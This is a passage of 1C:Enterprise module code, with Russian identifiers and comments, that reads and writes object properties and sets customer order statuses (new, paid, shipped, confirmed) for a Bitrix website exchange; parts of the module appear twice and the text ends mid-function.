//-------------------------------------------------------------------------
//автор: КучеровРМ 07.09.2018 
Функция ПолучитьЗначениеСвойстваОбъекта(Объект, КодСвойстваОбъекта, НазначениеСвойств) Экспорт
	
	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ ПЕРВЫЕ 1
	|	СвойстваОбъектов.Наименование КАК СвойстваОбъектовНаименование,
	|	СвойстваОбъектов.ПометкаУдаления КАК ПометкаУдаления,
	|	СвойстваОбъектов.Ссылка КАК Свойство,
	|	ЗначенияСвойствОбъектов.Значение КАК Значение
	|ИЗ
	|	(ВЫБРАТЬ
	|		СвойстваОбъектов.Ссылка КАК Ссылка,
	|		СвойстваОбъектов.Наименование КАК Наименование,
	|		СвойстваОбъектов.ПометкаУдаления КАК ПометкаУдаления
	|	ИЗ
	|		ПланВидовХарактеристик.СвойстваОбъектов КАК СвойстваОбъектов
	|	ГДЕ
	|		СвойстваОбъектов.НазначениеСвойства В(&НазначениеСвойств)) КАК СвойстваОбъектов
	|		ЛЕВОЕ СОЕДИНЕНИЕ РегистрСведений.ЗначенияСвойствОбъектов КАК ЗначенияСвойствОбъектов
	|		ПО (ЗначенияСвойствОбъектов.Свойство = СвойстваОбъектов.Ссылка)
	|			И (ЗначенияСвойствОбъектов.Объект = &ОбъектОтбораЗначений)
	|		ЛЕВОЕ СОЕДИНЕНИЕ РегистрСведений.НазначенияСвойствОбъектов КАК НазначенияСвойствОбъектов
	|		ПО (НазначенияСвойствОбъектов.Свойство = СвойстваОбъектов.Ссылка)
	|			И (ЗначенияСвойствОбъектов.Значение ЕСТЬ NULL )
	|ГДЕ
	|	(НазначенияСвойствОбъектов.Объект ЕСТЬ NULL 
	|			ИЛИ НазначенияСвойствОбъектов.Объект В (&СписокНазначенийСвойств))
	|	И СвойстваОбъектов.Ссылка.Код = &КодСвойстваОбъекта
	|
	|УПОРЯДОЧИТЬ ПО
	|	СвойстваОбъектовНаименование"";
	
	//КодСвойстваОбъекта 		= ""00000000048"";
	//НазначениеСвойств 		= ПланыВидовХарактеристик.НазначенияСвойствКатегорийОбъектов.Справочник_Контрагенты;
	ОбъектОтбораЗначений 	= Объект;
	СписокНазначенийСвойств = Объект;
	
	Запрос.УстановитьПараметр(""КодСвойстваОбъекта""	, КодСвойстваОбъекта);
	Запрос.УстановитьПараметр(""НазначениеСвойств""	, НазначениеСвойств);
	Запрос.УстановитьПараметр(""ОбъектОтбораЗначений"", ОбъектОтбораЗначений);
	Запрос.УстановитьПараметр(""СписокНазначенийСвойств"", СписокНазначенийСвойств);

	РезультатЗапроса = Запрос.Выполнить();
	
	ЗначениеСвойства = Неопределено;
	Если НЕ РезультатЗапроса.Пустой() Тогда
		ВыборкаДетальныеЗаписи = РезультатЗапроса.Выбрать();
		Если ВыборкаДетальныеЗаписи.Следующий() Тогда
			ВыборкаДетальныеЗаписиЗначение = ВыборкаДетальныеЗаписи.Значение;
			Если ВыборкаДетальныеЗаписиЗначение <> NULL Тогда
				ЗначениеСвойства = ВыборкаДетальныеЗаписиЗначение;
			Иначе
				ЗначениеСвойства = Неопределено;
			КонецЕсли
		КонецЕсли;
	КонецЕсли;

	Возврат ЗначениеСвойства;
	
КонецФункции // ПолучитьЗначениеСвойстваОбъекта()

//Функция ПолучитьЗначениеСвойства
//-------------------------------------------------------------------------
//Параметры:
//		КодСвойства - Строка - КодСвойства
//		КодЗначенияСвойства - Строка - КодЗначенияСвойства
//Возвращаемое значение:
//		Массив - Массив Значений заданного свойства, с типом СправочникСсылка.ЗначенияСвойствОбъектов
//		СправочникСсылка.ЗначенияСвойствОбъектов - Значение свойства, если получаем 1 элемент по коду
//		Неопределено - Если элементов 0
//-------------------------------------------------------------------------
//автор: КучеровРМ 07.09.2018 
Функция ПолучитьЗначениеСвойства(КодСвойства, КодЗначенияСвойства = """") Экспорт

	КодЗначенияСвойстваЗаполнен = НЕ ПустаяСтрока(КодЗначенияСвойства);
	Если КодЗначенияСвойстваЗаполнен Тогда
		ЗапросВЫБРАТЬ = ""ПЕРВЫЕ 1"";
		ЗапросКодЗначенияСвойства = ""
		|	И ЗначенияСвойствОбъектов.Код = &КодЗначенияСвойства"";
	Иначе
		ЗапросВЫБРАТЬ = """";
		ЗапросКодЗначенияСвойства = """";
	КонецЕсли;
	
	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ "" + ЗапросВЫБРАТЬ + ""
	|	ЗначенияСвойствОбъектов.Ссылка,
	|	ЗначенияСвойствОбъектов.ВерсияДанных,
	|	ЗначенияСвойствОбъектов.ПометкаУдаления,
	|	ЗначенияСвойствОбъектов.Предопределенный,
	|	ЗначенияСвойствОбъектов.Владелец,
	|	ЗначенияСвойствОбъектов.Родитель,
	|	ЗначенияСвойствОбъектов.ЭтоГруппа,
	|	ЗначенияСвойствОбъектов.Код,
	|	ЗначенияСвойствОбъектов.Наименование
	|ИЗ
	|	Справочник.ЗначенияСвойствОбъектов КАК ЗначенияСвойствОбъектов
	|ГДЕ
	|	ЗначенияСвойствОбъектов.Владелец.Код = &КодСвойства"";
	
	Если КодЗначенияСвойстваЗаполнен Тогда // Значит выводим одно значение соогласно переданому коду
		Запрос.Текст = Запрос.Текст + ЗапросКодЗначенияСвойства;
		Запрос.УстановитьПараметр(""КодЗначенияСвойства"", КодЗначенияСвойства);
	КонецЕсли;
	
	Запрос.УстановитьПараметр(""КодСвойства"", КодСвойства);
	
	РезультатЗапроса = Запрос.Выполнить();
	
	ЗначениеСвойства = Новый Массив;
	Если НЕ РезультатЗапроса.Пустой() Тогда
		ВыборкаДетальныеЗаписи = РезультатЗапроса.Выбрать();
		Пока ВыборкаДетальныеЗаписи.Следующий() Цикл
			ВыборкаДетальныеЗаписиСсылка = ВыборкаДетальныеЗаписи.Ссылка;
			ЗначениеСвойства.Добавить(ВыборкаДетальныеЗаписиСсылка);
			
			Если КодЗначенияСвойстваЗаполнен Тогда // Значит ожидаем одно значение согласно коду
				Прервать; 	
			КонецЕсли; 
		КонецЦикла;
	КонецЕсли;

	ЗначениеСвойстваКоличество = ЗначениеСвойства.Количество();
	Если ЗначениеСвойстваКоличество > 0 Тогда
		Если ЗначениеСвойстваКоличество > 1 Тогда
			Возврат ЗначениеСвойства;
		Иначе
			Возврат ЗначениеСвойства[0];
		КонецЕсли;
	Иначе
		Возврат Неопределено;
	КонецЕсли;
	
	Возврат ЗначениеСвойства; // На всякий случай
	
КонецФункции // ПолучитьЗначениеЗначениеСвойства()

////////////////////////////////////////////////////////////////////////////////
// Битрикс 

Функция ПлатежноеПоручениеУстановитьСвойства(Источник)

	Успех = Ложь;
	
	ИсточникСсылка 		= Источник.Ссылка;
	ИсточникОплачено 	= Источник.Оплачено;
	ИсточникДатаОплаты 	= Источник.ДатаОплаты;
	
	ИсточникРасшифровкаПлатежа = Источник.РасшифровкаПлатежа;
	
	Сделка = Неопределено;
	Если ИсточникРасшифровкаПлатежа.Количество() > 0 Тогда
		Сделка = ИсточникРасшифровкаПлатежа[0].Сделка;
	КонецЕсли;
	
	Если НЕ ЗначениеЗаполнено(Сделка) Тогда
		Возврат Успех;	
	КонецЕсли;
	
	КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
	
	Если ЗначениеЗаполнено(Сделка) Тогда
		СделкаЗаказПодтвержден 	= Сделка.ЗаказПодтвержден;
		
		КодСвойстваЗаказа 		= ""00000000048""; // Свойство заказов
		КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
		
		КодЗначенияСвойстваНовый 	= ""000000232""; // Новый
		КодЗначенияСвойстваОплачен 	= ""000000233""; // Оплачен
		КодЗначенияСвойстваПодтвержден 	= ""000000236""; // Подтвержден
		КодЗначенияСвойстваОплаченКОтгрузке = ""000000237""; // Оплачен, в стадии отгрузки
		
		ПлатежноеПоручениеДатаОплаты = ""00000000049"";
		
		Если НЕ СделкаЗаказПодтвержден Тогда
			Если ИсточникОплачено ИЛИ ЕстьОплатаЗаказа(Сделка) Тогда
				ЗадатьСтатусЗаказа(Сделка, КодСвойстваЗаказа, КодЗначенияСвойстваОплаченКОтгрузке);
				//Если ЗначениеЗаполнено(ИсточникДатаОплаты) Тогда
				//	НоваяДатаЗаказа 		= Формат(ИсточникДатаОплаты, ""ДФ=yyyy-MM-ddTHH:mm:ss"");
				//	СвойствоДатаОплатыУспех = ЗаписатьЗначениеСвойства(Сделка, КодСвойстваДатаОплаты, НоваяДатаЗаказа);
				//КонецЕсли;
			Иначе
				ЗадатьСтатусЗаказа(Сделка, КодСвойстваЗаказа, КодЗначенияСвойстваНовый);
			КонецЕсли;
			//ЗначениеСвойства 	= ПолучитьЗначениеСвойства(КодСвойстваЗаказа, КодЗначенияСвойства);
			ИзменениеУспех 		= ЗаписатьЗначениеСвойства(ИсточникСсылка, ПлатежноеПоручениеДатаОплаты, """"); // Т.к. на сайте дата оплаты сразу переводит сделку в завершённую
			//ЗадатьСтатусЗаказа(ИсточникСсылка, ПлатежноеПоручениеДатаОплаты, """"); // Т.к. на сайте дата оплаты сразу переводит сделку в завершённую 
		Иначе
			ЗадатьСтатусЗаказа(Сделка, КодСвойстваЗаказа, КодЗначенияСвойстваПодтвержден);	
		КонецЕсли;
		
		Успех = Истина;
		
	КонецЕсли;

	Возврат Успех;
	
КонецФункции // ПлатежноеПоручениеУстановитьСвойства()
 
Функция РеализацияТоваровУслугУстановитьСвойства(Источник)
	
	Успех = Ложь;
	
	ИсточникСсылка 		= Источник.Ссылка;
	ИсточникПроведен 	= Источник.Проведен;
	ИсточникСделка 		= Источник.Сделка;
	
	Если НЕ ЗначениеЗаполнено(ИсточникСделка) Тогда
		Возврат Успех;	
	КонецЕсли;
	
	КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
	
	ИсточникСделкаЗаказПодтвержден = ИсточникСделка.ЗаказПодтвержден;
	
	Если Истина Тогда // ИсточникПроведен Тогда
		КодСвойстваЗаказа 		= ""00000000048""; // Свойство заказов
		КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
		
		КодЗначенияСвойстваНовый 	= ""000000232""; // Новый
		КодЗначенияСвойстваОплачен 	= ""000000234""; // Оплачен
		КодЗначенияСвойстваПодтвержден 	= ""000000236""; // Подтвержден
		КодЗначенияСвойстваОтправленКлиенту = ""000000233""; // Отправлен клиенту
		
		КодЗначенияСвойстваОплаченКОтгрузке = ""000000237""; // Оплачен, в стадии отгрузки
		
		Если ИсточникСделкаЗаказПодтвержден Тогда
			ЗадатьСтатусЗаказа(ИсточникСделка, КодСвойстваЗаказа, КодЗначенияСвойстваОтправленКлиенту);
		ИначеЕсли ЕстьОплатаЗаказа(ИсточникСделка) Тогда
			ЗадатьСтатусЗаказа(ИсточникСделка, КодСвойстваЗаказа, КодЗначенияСвойстваОплачен);
			//	Если ЗначениеЗаполнено(ИсточникДатаОплаты) Тогда
			//		НоваяДатаЗаказа 		= Формат(ИсточникДатаОплаты, ""ДФ=yyyy-MM-ddTHH:mm:ss"");
			//		СвойствоДатаОплатыУспех = ЗаписатьЗначениеСвойства(ИсточникСделка, КодСвойстваДатаОплаты, НоваяДатаЗаказа);
			//	КонецЕсли;
			//Иначе
			//	ЗадатьСтатусЗаказа(ИсточникСделка, КодСвойстваЗаказа, КодЗначенияСвойстваНовый);
		КонецЕсли;
		
		Успех = Истина;
		
	КонецЕсли;

	Возврат Успех;	
	
КонецФункции // РеализацияТоваровУслугУстановитьСвойства()

Функция ЕстьОплатаЗаказа(ЗаказПокупателяСсылка) Экспорт
	
	Найден = Ложь;
	
	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ ПЕРВЫЕ 1
	|	ПлатежноеПоручениеВходящее.Ссылка,
	|	ПлатежноеПоручениеВходящее.ДокументОснование,
	|	ПлатежноеПоручениеВходящее.ДатаОплаты
	|ИЗ
	|	Документ.ПлатежноеПоручениеВходящее КАК ПлатежноеПоручениеВходящее
	|ГДЕ
	|	ПлатежноеПоручениеВходящее.ДокументОснование = &ДокументОснование
	|	И ПлатежноеПоручениеВходящее.Оплачено
	|	И НЕ ПлатежноеПоручениеВходящее.ПометкаУдаления"";
	
	Запрос.УстановитьПараметр(""ДокументОснование"", ЗаказПокупателяСсылка);
	
	РезультатЗапроса = Запрос.Выполнить();
	
	Если НЕ РезультатЗапроса.Пустой() Тогда
		Найден = Истина;
	КонецЕсли; 
	
	Возврат Найден;
	
КонецФункции // ЕстьОплатаЗаказа()

Функция ЕстьРеализацияЗаказа(ЗаказПокупателяСсылка) Экспорт
	
	Найден = Ложь;
	
	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ ПЕРВЫЕ 1
	|	РеализацияТоваровУслуг.Ссылка,
	|	РеализацияТоваровУслуг.Сделка
	|ИЗ
	|	Документ.РеализацияТоваровУслуг КАК РеализацияТоваровУслуг
	|ГДЕ
	|	РеализацияТоваровУслуг.Сделка = &Сделка
	|	И РеализацияТоваровУслуг.Проведен
	|	И НЕ РеализацияТоваровУслуг.ПометкаУдаления"";
	
	Запрос.УстановитьПараметр(""Сделка"", ЗаказПокупателяСсылка);
	
	РезультатЗапроса = Запрос.Выполнить();
	
	Если НЕ РезультатЗапроса.Пустой() Тогда
		Найден = Истина;
	КонецЕсли; 
	
	Возврат Найден;
	
КонецФункции // ЕстьОплатаЗаказа()

Функция СменаСтатуса(Документ) Экспорт 
	
	ДокументОплачен 			= Документ.Оплачен;
	
	ДокументЗаказПодтвержден 	= Документ.Заказ.ЗаказПодтвержден;
	ДокументЗаказ 				= Документ.Заказ;
	
	ЕстьРеализацияЗаказа = ЕстьРеализацияЗаказа(ДокументЗаказ);
	
	// Коды свойств и их значений
	КодСвойстваЗаказа = ""00000000048""; // Свойство заказов
	
	КодЗначенияСвойстваНовый 		= ""000000232""; // Новый
	КодЗначенияСвойстваПодтвержден 	= ""000000236""; // Подтвержден
	КодЗначенияСвойстваОплачен 		= ""000000234""; // Оплачен
	КодЗначенияСвойстваОплаченКОтгрузке = ""000000237""; // Оплачен, в стадии отгрузки
	КодЗначенияСвойстваОтправленКлиенту = ""000000233""; // Отправлен клиенту
	КодЗначенияСвойстваОтправленЖдемОплату = ""000000238""; // Отгружен, ждем оплату
	
	НачальноеСостояниеСтатуса 	= КодЗначенияСвойстваОтправленКлиенту;
	КонечноеСостояниеСтатуса 	= КодЗначенияСвойстваОплачен;
	
	КодЗначениеСвойстваСтатусЗаказа = НачальноеСостояниеСтатуса; //КодЗначенияСвойстваНовый
	
	// Приминение статуса
	Если ДокументЗаказПодтвержден Тогда
		Если ЕстьРеализацияЗаказа И ДокументОплачен Тогда
			КодЗначениеСвойстваСтатусЗаказа = КонечноеСостояниеСтатуса; //КодЗначенияСвойстваОплачен
		ИначеЕсли ЕстьРеализацияЗаказа И НЕ ДокументОплачен Тогда
			КодЗначениеСвойстваСтатусЗаказа = КодЗначенияСвойстваОтправленЖдемОплату; // КодЗначенияСвойстваОтправленКлиенту
		ИначеЕсли НЕ ЕстьРеализацияЗаказа И НЕ ДокументОплачен Тогда
			КодЗначениеСвойстваСтатусЗаказа = КодЗначенияСвойстваПодтвержден;
		ИначеЕсли ДокументОплачен Тогда
			КодЗначениеСвойстваСтатусЗаказа = КодЗначенияСвойстваОплаченКОтгрузке;
		КонецЕсли; 
	Иначе
		Если ДокументОплачен Тогда
			Если ЕстьРеализацияЗаказа Тогда
				КодЗначениеСвойстваСтатусЗаказа = КонечноеСостояниеСтатуса; //КодЗначенияСвойстваОплачен
			Иначе
				КодЗначениеСвойстваСтатусЗаказа = КодЗначенияСвойстваОплаченКОтгрузке;
			КонецЕсли; 
		КонецЕсли;
	КонецЕсли; 
	//ЗадатьСтатусЗаказа(ДокументЗаказ, КодСвойстваЗаказа, КодЗначенияСвойстваОплаченКОтгрузке);	
	
	Если ТипЗнч(Документ.Объект) = Тип(""ДокументСсылка.ЗаказПокупателя"") Тогда
		ЗначениеСвойстваСтатусЗаказа 	= ПолучитьЗначениеСвойства(КодСвойстваЗаказа, КодЗначениеСвойстваСтатусЗаказа);
		Документ.СвойствоСтатусЗаказа 	= ЗначениеСвойстваСтатусЗаказа;
		
		ЗадатьСтатусЗаказа(ДокументЗаказ, КодСвойстваЗаказа, КодЗначениеСвойстваСтатусЗаказа, Ложь); // Это частичная магия, при этом встанет конечное состояние статуса сделки
	КонецЕсли; 
	
	КонечныйСтатус = КодЗначениеСвойстваСтатусЗаказа = КодЗначенияСвойстваОплачен; // Совсем конечный статус (типа ""Выполнен"")
	
	Возврат КонечныйСтатус;
	
КонецФункции // СменаСтатуса()
 
// Дописать в ОМ -\ Б_ПроцедурыИФункцииВыгрузкиДанныхНаСайт 
//-\ ВыгрузитьЗаказXDTO
// После строки: XDTOЗначенияРеквизитов 		= ПараметрыОбмена.МояФабрикаXDTO.Создать(XDTOЗначенияРеквизитовТип); 
////+++ АйТи КучеровРМ 20.09.2018 ТЗ № ИС00-004698
//	Если НЕ Документ.Оплачен Тогда // Это магия, только при этом условии встанет конечное состояние статуса сделки
//		МожноВыводитьИнфоПоОплате 	= АйТи_Доработки.СменаСтатуса(Документ);
//		Документ.Оплачен 			= МожноВыводитьИнфоПоОплате;
//	КонецЕсли;
//	//--- АйТи КучеровРМ 20.09.2018 ТЗ № ИС00-004698
//-\ ВыгрузитьОплатуXDTO
////+++ АйТи КучеровРМ 20.09.2018 ТЗ № ИС00-004698
//	Если НЕ Документ.Проведен Тогда // Это магия, только при этом условии встанет конечное состояние статуса сделки
//		МожноВыводитьИнфоПоОплате 	= АйТи_Доработки.СменаСтатуса(Документ);
//		Документ.Оплачен 			= МожноВыводитьИнфоПоОплате;
//	КонецЕсли; 
//	//--- АйТи КучеровРМ 20.09.2018 ТЗ № ИС00-004698

//--- ====== Битрикс. Статусы [ АйТи КучеровРМ 20.09.2018 ТЗ № ИС00-004698 ] ================================================ 

#КонецОбласти
"}
},
{0,
{"Модуль Статусы (загружая инфо о счетах) (без модификаций)",0,0,"","
////////////////////////////////////////////////////////////////////////////////
// Влюбленная в свое дело команда ООО «АйТи-Консалтинг»,
// г. Ярославль, ул. Советская, д.69, к.2, этаж 1,
// тел. (4852) 59-33-33, info@allzon.ru,
// https://itcons99.ru/, http://itcons76.ru/
////////////////////////////////////////////////////////////////////////////////

#Область БитриксСтатусы
	
//+++ ====== Битрикс. Статусы [ АйТи КучеровРМ 20.09.2018 ТЗ № ИС00-004698 ] ================================================

////////////////////////////////////////////////////////////////////////////////
// Свойства 

Функция ЗадатьСтатусЗаказа(Объект, КодСвойстваЗаказа, КодЗначенияСвойства, СтиратьДату = Истина)

	ЗначениеСвойства 	= ПолучитьЗначениеСвойства(КодСвойстваЗаказа, КодЗначенияСвойства);
	ИзменениеУспех 		= ЗаписатьЗначениеСвойства(Объект, КодСвойстваЗаказа, ЗначениеСвойства); 
	
	Если СтиратьДату Тогда
		КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
		СвойствоДатаОплатыУспех = ЗаписатьЗначениеСвойства(Объект, КодСвойстваДатаОплаты, """");
	КонецЕсли; 
	
	Возврат ИзменениеУспех;
	
КонецФункции // ОбновитьСтатусЗаказа()
 
Функция ЗаписатьЗначениеСвойства(ОбъектСсылка, КодСвойстваОбъекта, Значение) 
	
	НаборЗаписейЗначенияСвойств = РегистрыСведений.ЗначенияСвойствОбъектов.СоздатьНаборЗаписей();
	
	Если Значение <> Неопределено Тогда
		Запись 			= НаборЗаписейЗначенияСвойств.Добавить();
		Запись.Объект   = ОбъектСсылка;
		Свойство 		= ПланыВидовХарактеристик.СвойстваОбъектов.НайтиПоКоду(КодСвойстваОбъекта);
		Запись.Свойство = Свойство.Ссылка;
		Запись.Значение = Значение;
		
		НаборЗаписейЗначенияСвойств.Отбор.Объект.Установить(ОбъектСсылка);
		НаборЗаписейЗначенияСвойств.Отбор.Свойство.Установить(Свойство); //.Ссылка
		
		Попытка
			НаборЗаписейЗначенияСвойств.Записать();
			Возврат Истина;
		Исключение
			Предупреждение(""Не удалось записать значения свойств:"" + Символы.ПС + ОписаниеОшибки());
			Возврат Ложь;
		КонецПопытки;
	КонецЕсли;
	
	Возврат Ложь; 
	
КонецФункции

Функция ЗаписатьЗначенияСвойстваСтруктура(ОбъектСсылка, СтруктураСвойства) 
	
	НаборЗаписейЗначенияСвойств = РегистрыСведений.ЗначенияСвойствОбъектов.СоздатьНаборЗаписей();
	
	Если ЗначениеЗаполнено(СтруктураСвойства.Значение) Тогда
		Запись 			= НаборЗаписейЗначенияСвойств.Добавить();
		Запись.Объект   = ОбъектСсылка;
		Свойство 		= ПланыВидовХарактеристик.СвойстваОбъектов.НайтиПоКоду(СтруктураСвойства.КодСвойстваОбъекта);
		Запись.Свойство = Свойство.Ссылка;
		Запись.Значение = СтруктураСвойства.Значение;
	КонецЕсли;
	
	НаборЗаписейЗначенияСвойств.Отбор.Объект.Установить(ОбъектСсылка);
	НаборЗаписейЗначенияСвойств.Отбор.Свойство.Установить(Свойство); //.Ссылка
	
	Попытка
		НаборЗаписейЗначенияСвойств.Записать();
	Исключение
		Сообщить(""Не удалось записать значения свойств:"" + Символы.ПС + ОписаниеОшибки());
		Возврат Ложь;
	КонецПопытки;
	
	Возврат Истина; 
	
КонецФункции

//Функция ПолучитьЗначениеСвойстваОбъекта
//-------------------------------------------------------------------------
//Параметры:
//		Объект - Ссылка - Ссылка на объект, свойство которого надо получить
//		КодСвойстваОбъекта - Строка - Код свойства, значения которого получаем
//		НазначениеСвойств - ПланВидовХарактеристикСсылка.НазначенияСвойствКатегорийОбъектов - Напр., ПланыВидовХарактеристик.НазначенияСвойствКатегорийОбъектов.Справочник_Контрагенты
//		Параметр - Тип - описание
//Возвращаемое значение:
//		СправочникСсылка.ЗначенияСвойствОбъектов - Значение свойства
//-------------------------------------------------------------------------
//автор: КучеровРМ 07.09.2018 
Функция ПолучитьЗначениеСвойстваОбъекта(Объект, КодСвойстваОбъекта, НазначениеСвойств) Экспорт
	
	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ ПЕРВЫЕ 1
	|	СвойстваОбъектов.Наименование КАК СвойстваОбъектовНаименование,
	|	СвойстваОбъектов.ПометкаУдаления КАК ПометкаУдаления,
	|	СвойстваОбъектов.Ссылка КАК Свойство,
	|	ЗначенияСвойствОбъектов.Значение КАК Значение
	|ИЗ
	|	(ВЫБРАТЬ
	|		СвойстваОбъектов.Ссылка КАК Ссылка,
	|		СвойстваОбъектов.Наименование КАК Наименование,
	|		СвойстваОбъектов.ПометкаУдаления КАК ПометкаУдаления
	|	ИЗ
	|		ПланВидовХарактеристик.СвойстваОбъектов КАК СвойстваОбъектов
	|	ГДЕ
	|		СвойстваОбъектов.НазначениеСвойства В(&НазначениеСвойств)) КАК СвойстваОбъектов
	|		ЛЕВОЕ СОЕДИНЕНИЕ РегистрСведений.ЗначенияСвойствОбъектов КАК ЗначенияСвойствОбъектов
	|		ПО (ЗначенияСвойствОбъектов.Свойство = СвойстваОбъектов.Ссылка)
	|			И (ЗначенияСвойствОбъектов.Объект = &ОбъектОтбораЗначений)
	|		ЛЕВОЕ СОЕДИНЕНИЕ РегистрСведений.НазначенияСвойствОбъектов КАК НазначенияСвойствОбъектов
	|		ПО (НазначенияСвойствОбъектов.Свойство = СвойстваОбъектов.Ссылка)
	|			И (ЗначенияСвойствОбъектов.Значение ЕСТЬ NULL )
	|ГДЕ
	|	(НазначенияСвойствОбъектов.Объект ЕСТЬ NULL 
	|			ИЛИ НазначенияСвойствОбъектов.Объект В (&СписокНазначенийСвойств))
	|	И СвойстваОбъектов.Ссылка.Код = &КодСвойстваОбъекта
	|
	|УПОРЯДОЧИТЬ ПО
	|	СвойстваОбъектовНаименование"";
	
	//КодСвойстваОбъекта 		= ""00000000048"";
	//НазначениеСвойств 		= ПланыВидовХарактеристик.НазначенияСвойствКатегорийОбъектов.Справочник_Контрагенты;
	ОбъектОтбораЗначений 	= Объект;
	СписокНазначенийСвойств = Объект;
	
	Запрос.УстановитьПараметр(""КодСвойстваОбъекта""	, КодСвойстваОбъекта);
	Запрос.УстановитьПараметр(""НазначениеСвойств""	, НазначениеСвойств);
	Запрос.УстановитьПараметр(""ОбъектОтбораЗначений"", ОбъектОтбораЗначений);
	Запрос.УстановитьПараметр(""СписокНазначенийСвойств"", СписокНазначенийСвойств);

	РезультатЗапроса = Запрос.Выполнить();
	
	ЗначениеСвойства = Неопределено;
	Если НЕ РезультатЗапроса.Пустой() Тогда
		ВыборкаДетальныеЗаписи = РезультатЗапроса.Выбрать();
		Если ВыборкаДетальныеЗаписи.Следующий() Тогда
			ВыборкаДетальныеЗаписиЗначение = ВыборкаДетальныеЗаписи.Значение;
			Если ВыборкаДетальныеЗаписиЗначение <> NULL Тогда
				ЗначениеСвойства = ВыборкаДетальныеЗаписиЗначение;
			Иначе
				ЗначениеСвойства = Неопределено;
			КонецЕсли
		КонецЕсли;
	КонецЕсли;

	Возврат ЗначениеСвойства;
	
КонецФункции // ПолучитьЗначениеСвойстваОбъекта()

//Функция ПолучитьЗначениеСвойства
//-------------------------------------------------------------------------
//Параметры:
//		КодСвойства - Строка - КодСвойства
//		КодЗначенияСвойства - Строка - КодЗначенияСвойства
//Возвращаемое значение:
//		Массив - Массив Значений заданного свойства, с типом СправочникСсылка.ЗначенияСвойствОбъектов
//		СправочникСсылка.ЗначенияСвойствОбъектов - Значение свойства, если получаем 1 элемент по коду
//		Неопределено - Если элементов 0
//-------------------------------------------------------------------------
//автор: КучеровРМ 07.09.2018 
Функция ПолучитьЗначениеСвойства(КодСвойства, КодЗначенияСвойства = """") Экспорт

	КодЗначенияСвойстваЗаполнен = НЕ ПустаяСтрока(КодЗначенияСвойства);
	Если КодЗначенияСвойстваЗаполнен Тогда
		ЗапросВЫБРАТЬ = ""ПЕРВЫЕ 1"";
		ЗапросКодЗначенияСвойства = ""
		|	И ЗначенияСвойствОбъектов.Код = &КодЗначенияСвойства"";
	Иначе
		ЗапросВЫБРАТЬ = """";
		ЗапросКодЗначенияСвойства = """";
	КонецЕсли;
	
	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ "" + ЗапросВЫБРАТЬ + ""
	|	ЗначенияСвойствОбъектов.Ссылка,
	|	ЗначенияСвойствОбъектов.ВерсияДанных,
	|	ЗначенияСвойствОбъектов.ПометкаУдаления,
	|	ЗначенияСвойствОбъектов.Предопределенный,
	|	ЗначенияСвойствОбъектов.Владелец,
	|	ЗначенияСвойствОбъектов.Родитель,
	|	ЗначенияСвойствОбъектов.ЭтоГруппа,
	|	ЗначенияСвойствОбъектов.Код,
	|	ЗначенияСвойствОбъектов.Наименование
	|ИЗ
	|	Справочник.ЗначенияСвойствОбъектов КАК ЗначенияСвойствОбъектов
	|ГДЕ
	|	ЗначенияСвойствОбъектов.Владелец.Код = &КодСвойства"";
	
	Если КодЗначенияСвойстваЗаполнен Тогда // Значит выводим одно значение соогласно переданому коду
		Запрос.Текст = Запрос.Текст + ЗапросКодЗначенияСвойства;
		Запрос.УстановитьПараметр(""КодЗначенияСвойства"", КодЗначенияСвойства);
	КонецЕсли;
	
	Запрос.УстановитьПараметр(""КодСвойства"", КодСвойства);
	
	РезультатЗапроса = Запрос.Выполнить();
	
	ЗначениеСвойства = Новый Массив;
	Если НЕ РезультатЗапроса.Пустой() Тогда
		ВыборкаДетальныеЗаписи = РезультатЗапроса.Выбрать();
		Пока ВыборкаДетальныеЗаписи.Следующий() Цикл
			ВыборкаДетальныеЗаписиСсылка = ВыборкаДетальныеЗаписи.Ссылка;
			ЗначениеСвойства.Добавить(ВыборкаДетальныеЗаписиСсылка);
			
			Если КодЗначенияСвойстваЗаполнен Тогда // Значит ожидаем одно значение согласно коду
				Прервать; 	
			КонецЕсли; 
		КонецЦикла;
	КонецЕсли;

	ЗначениеСвойстваКоличество = ЗначениеСвойства.Количество();
	Если ЗначениеСвойстваКоличество > 0 Тогда
		Если ЗначениеСвойстваКоличество > 1 Тогда
			Возврат ЗначениеСвойства;
		Иначе
			Возврат ЗначениеСвойства[0];
		КонецЕсли;
	Иначе
		Возврат Неопределено;
	КонецЕсли;
	
	Возврат ЗначениеСвойства; // На всякий случай
	
КонецФункции // ПолучитьЗначениеЗначениеСвойства()

////////////////////////////////////////////////////////////////////////////////
// Битрикс 

Функция ПлатежноеПоручениеУстановитьСвойства(Источник)

	Успех = Ложь;
	
	ИсточникСсылка 		= Источник.Ссылка;
	ИсточникОплачено 	= Источник.Оплачено;
	ИсточникДатаОплаты 	= Источник.ДатаОплаты;
	
	ИсточникРасшифровкаПлатежа = Источник.РасшифровкаПлатежа;
	
	Сделка = Неопределено;
	Если ИсточникРасшифровкаПлатежа.Количество() > 0 Тогда
		Сделка = ИсточникРасшифровкаПлатежа[0].Сделка;
	КонецЕсли;
	
	Если НЕ ЗначениеЗаполнено(Сделка) Тогда
		Возврат Успех;	
	КонецЕсли;
	
	КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
	
	Если ЗначениеЗаполнено(Сделка) Тогда
		СделкаЗаказПодтвержден 	= Сделка.ЗаказПодтвержден;
		
		КодСвойстваЗаказа 		= ""00000000048""; // Свойство заказов
		КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
		
		КодЗначенияСвойстваНовый 	= ""000000232""; // Новый
		КодЗначенияСвойстваОплачен 	= ""000000233""; // Оплачен
		КодЗначенияСвойстваПодтвержден 	= ""000000236""; // Подтвержден
		КодЗначенияСвойстваОплаченКОтгрузке = ""000000237""; // Оплачен, в стадии отгрузки
		
		ПлатежноеПоручениеДатаОплаты = ""00000000049"";
		
		Если НЕ СделкаЗаказПодтвержден Тогда
